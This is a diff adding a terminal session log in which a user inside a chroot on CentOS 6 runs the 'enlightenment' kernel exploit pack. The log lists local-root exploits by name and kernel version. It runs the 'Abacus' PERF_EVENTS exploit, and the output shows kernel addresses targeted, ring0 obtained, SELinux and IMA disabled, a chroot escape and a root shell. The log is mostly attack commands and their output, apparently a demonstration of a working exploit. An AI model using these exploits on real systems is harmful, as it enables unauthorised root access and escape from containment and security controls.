@@ -1,0 +1,83 @@
+[spender@centos6 ~]$ su -
+Password: 
+[root@centos6 ~]# chroot /home/spender/chroot
+bash-4.1# ls
+bin  enlightenment  etc  lib64	usr
+bash-4.1# su - spender
+su: warning: cannot change directory to /home/spender: No such file or directory
+-bash: /dev/null: No such file or directory
+-bash: /dev/null: No such file or directory
+-bash: /dev/null: No such file or directory
+-bash: /dev/null: No such file or directory
+-bash: /dev/null: No such file or directory
+-bash: warning: setlocale: LC_CTYPE: cannot change locale (en_US.UTF-8): No such file or directory
+-bash: warning: setlocale: LC_COLLATE: cannot change locale (en_US.UTF-8): No such file or directory
+-bash: warning: setlocale: LC_MESSAGES: cannot change locale (en_US.UTF-8): No such file or directory
+-bash: warning: setlocale: LC_NUMERIC: cannot change locale (en_US.UTF-8): No such file or directory
+-bash: warning: setlocale: LC_TIME: cannot change locale (en_US.UTF-8): No such file or directory
+-bash: /sbin/consoletype: No such file or directory
+-bash: /dev/null: No such file or directory
+-bash-4.1$ cd enlightenment/
+-bash-4.1$ ./run_nonnull_exploits.sh 
+Compiling exp_abacus.c..../run_null_exploits.sh: line 16: /dev/null: No such file or directory
+./run_null_exploits.sh: line 18: /dev/null: No such file or directory
+failed.
+Compiling exp_cheddarbay.c..../run_null_exploits.sh: line 16: /dev/null: No such file or directory
+./run_null_exploits.sh: line 18: /dev/null: No such file or directory
+failed.
+Compiling exp_ingom0wnar.c..../run_null_exploits.sh: line 16: /dev/null: No such file or directory
+./run_null_exploits.sh: line 18: /dev/null: No such file or directory
+failed.
+Compiling exp_moosecox.c..../run_null_exploits.sh: line 16: /dev/null: No such file or directory
+./run_null_exploits.sh: line 18: /dev/null: No such file or directory
+failed.
+Compiling exp_paokara.c..../run_null_exploits.sh: line 16: /dev/null: No such file or directory
+./run_null_exploits.sh: line 18: /dev/null: No such file or directory
+failed.
+Compiling exp_powerglove.c..../run_null_exploits.sh: line 16: /dev/null: No such file or directory
+./run_null_exploits.sh: line 18: /dev/null: No such file or directory
+failed.
+Compiling exp_sieve.c..../run_null_exploits.sh: line 16: /dev/null: No such file or directory
+./run_null_exploits.sh: line 18: /dev/null: No such file or directory
+failed.
+Compiling exp_therebel.c..../run_null_exploits.sh: line 16: /dev/null: No such file or directory
+./run_null_exploits.sh: line 18: /dev/null: No such file or directory
+failed.
+Compiling exp_vmware.c..../run_null_exploits.sh: line 16: /dev/null: No such file or directory
+./run_null_exploits.sh: line 18: /dev/null: No such file or directory
+failed.
+Compiling exp_wunderbar.c..../run_null_exploits.sh: line 16: /dev/null: No such file or directory
+./run_null_exploits.sh: line 18: /dev/null: No such file or directory
+failed.
+./run_null_exploits.sh: line 30: /dev/null: No such file or directory
+./run_null_exploits.sh: line 35: /dev/null: No such file or directory
+./run_null_exploits.sh: line 37: /dev/null: No such file or directory
+Choose your exploit:
+ [0] Abacus: Linux 2.6.37 -> 3.8.8 PERF_EVENTS local root
+ [1] Ingo m0wnar: Linux 2.6.31 perf_counter local root (Ingo backdoor method)
+ [2] Sieve: Linux 2.6.18+ move_pages() infoleak
+ [3] Exit
+> 0
+ ------------------------------------------------------------------------------
+ To be free is nothing, to become free is everything. --Hegel
+ ------------------------------------------------------------------------------
+ [+] Submitting index of -1 to perf_event_open
+ [+] Submitting index of -2 to perf_event_open
+ [+] Array base is 0xffffffff81f360c0
+ [+] Targeting 0xffffffff81dde048
+ [+] Submitting index of -352286 to perf_event_open
+ [+] Got ring0!
+ [+] Obtained internal symbol table for extended functionality
+ [+] Detected 2.6/3.x style 8k stacks, with current at 0xffff8800370b0040 and cred support
+ [+] Disabled security of : SELinux IMA
+ [+] Found ->fs offset at 0x750
+ [+] Broke out of any chroots or mnt namespaces
+ [+] Got root!
+sh-4.1# pwd
+/home/spender/chroot/enlightenment
+sh-4.1# cd /
+sh-4.1# ls
+bin   cgroup  etc   lib    lost+found  misc  net  proc	sbin	 srv  tmp  var
+boot  dev     home  lib64  media       mnt   opt  root	selinux  sys  usr
+sh-4.1# 
+
